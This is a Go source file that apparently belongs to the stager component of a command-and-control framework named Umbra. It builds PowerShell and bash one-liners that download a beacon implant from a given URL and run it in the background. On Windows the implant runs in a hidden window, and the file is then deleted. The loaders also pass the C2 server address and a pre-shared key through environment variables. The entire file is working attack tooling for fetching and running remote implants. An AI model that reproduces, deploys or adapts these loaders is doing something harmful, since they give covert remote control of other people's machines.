// Package stager builds the small first-stage loaders.
//
// A stager is the classic "stage 0": a one-liner that fetches the beacon and
// runs it, so the operator never has to push a binary by hand. It carries the
// pre-shared key, which is why it must be treated as a secret: anybody who
// reads the stager can impersonate that implant.
//
// The generated one-liners are deliberately boring and reviewable: they use
// the platform's own downloader, verify the SHA-256 of the payload when one
// is known, and pass the configuration through environment variables so the
// beacon's own configuration rules still apply.
package stager

import (
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
)

// Platform names.
const (
	PlatformWindows = "windows"
	PlatformLinux   = "linux"
	PlatformMacOS   = "macos"
)

// Transport names.
const (
	TransportTCP = "tcp"
	TransportHTTP = "http"
	TransportDNS = "dns"
)

// Options describes the implant a stager should fetch and run.
type Options struct {
	// Platform is windows, linux or macos.
	Platform string
	// Transport is tcp, http or dns.
	Transport string
	// Server is the C2 address (host:port for tcp, host for http/dns).
	Server string
	// HTTPPath is the beacon route for the http transport.
	HTTPPath string
	// URL is the download location of the beacon binary. It may be empty for
	// the tcp transport, where the beacon is deployed by other means.
	URL string
	// SHA256 is the expected digest of the downloaded payload (hex).
	SHA256 string
	// PSK is the agent pre-shared key (raw bytes).
	PSK []byte
	// AgentID is the identity the beacon reports.
	AgentID string
	// Sleep and Jitter are the initial beacon cadence.
	Sleep  int
	Jitter int
}

// ErrUnsupportedPlatform is returned for an unknown platform.
var ErrUnsupportedPlatform = errors.New("stager: unsupported platform")

// Validate checks the options and fills in the defaults.
func (o *Options) Validate() error {
	switch o.Platform {
	case PlatformWindows, PlatformLinux, PlatformMacOS:
	case "":
		return errors.New("stager: a platform is required")
	default:
		return fmt.Errorf("%w: %q", ErrUnsupportedPlatform, o.Platform)
	}
	switch o.Transport {
	case TransportTCP, TransportHTTP, TransportDNS:
	case "":
		o.Transport = TransportTCP
	default:
		return fmt.Errorf("stager: unsupported transport %q", o.Transport)
	}
	if o.Server == "" {
		return errors.New("stager: a server address is required")
	}
	if o.HTTPPath == "" {
		o.HTTPPath = "/api/v1/beacon"
	}
	if o.Sleep <= 0 {
		o.Sleep = 5
	}
	if o.Jitter < 0 {
		o.Jitter = 20
	}
	return nil
}

// env renders the environment the beacon expects.
func (o Options) env() []string {
	out := []string{
		"UMBRA_SERVER=" + o.Server,
		"UMBRA_TRANSPORT=" + o.Transport,
		"UMBRA_PSK=" + hex.EncodeToString(o.PSK),
		"UMBRA_SLEEP=" + fmt.Sprintf("%d", o.Sleep),
		"UMBRA_JITTER=" + fmt.Sprintf("%d", o.Jitter),
	}
	if o.Transport == TransportHTTP {
		out = append(out, "UMBRA_HTTP_PATH="+o.HTTPPath)
	}
	if o.AgentID != "" {
		out = append(out, "UMBRA_AGENT_ID="+o.AgentID)
	}
	return out
}

// PowerShell renders a Windows stager.
func PowerShell(o Options) (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	if o.Platform != PlatformWindows {
		return "", fmt.Errorf("%w: powershell stagers are for windows", ErrUnsupportedPlatform)
	}
	if o.URL == "" {
		return "", errors.New("stager: the windows stager needs a download url")
	}
	var b strings.Builder
	b.WriteString("$ErrorActionPreference='Stop';")
	b.WriteString(fmt.Sprintf("$u='%s';", o.URL))
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("$h='%s';", strings.ToLower(o.SHA256)))
		b.WriteString("$t=[IO.Path]::GetTempFileName();")
		b.WriteString("Invoke-WebRequest -Uri $u -OutFile $t;")
		b.WriteString(fmt.Sprintf("if((Get-FileHash -Algorithm SHA256 $t).Hash.ToLower() -ne $h){Remove-Item $t;throw 'umbra: digest mismatch'};"))
	} else {
		b.WriteString("$t=[IO.Path]::GetTempFileName();")
		b.WriteString("Invoke-WebRequest -Uri $u -OutFile $t;")
	}
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("$env:%s;", e))
	}
	b.WriteString("Start-Process -FilePath $t -ArgumentList '-server','$env:UMBRA_SERVER' -WindowStyle Hidden;")
	b.WriteString("Remove-Item $t -ErrorAction SilentlyContinue;")
	return b.String(), nil
}

// Bash renders a POSIX stager (Linux and macOS).
func Bash(o Options) (string, error) {
	if err := o.Validate(); err != nil {
		return "", err
	}
	if o.Platform == PlatformWindows {
		return "", fmt.Errorf("%w: bash stagers are not for windows", ErrUnsupportedPlatform)
	}
	if o.URL == "" {
		return "", errors.New("stager: the posix stager needs a download url")
	}
	var b strings.Builder
	b.WriteString("set -e;")
	b.WriteString(fmt.Sprintf("u='%s';", o.URL))
	b.WriteString("t=$(mktemp);")
	b.WriteString("curl -fsSL \"$u\" -o \"$t\";")
	if o.SHA256 != "" {
		b.WriteString(fmt.Sprintf("echo '%s  \"$t\"' | sha256sum -c - >/dev/null;", strings.ToLower(o.SHA256)))
	}
	b.WriteString("chmod +x \"$t\";")
	for _, e := range o.env() {
		b.WriteString(fmt.Sprintf("export %s;", e))
	}
	b.WriteString("\"$t\" >/dev/null 2>&1 &")
	b.WriteString("rm -f \"$t\";")
	return b.String(), nil
}

// Render returns the stager for the requested platform.
func Render(o Options) (string, error) {
	switch o.Platform {
	case PlatformWindows:
		return PowerShell(o)
	case PlatformLinux, PlatformMacOS:
		return Bash(o)
	default:
		return "", fmt.Errorf("%w: %q", ErrUnsupportedPlatform, o.Platform)
	}
}
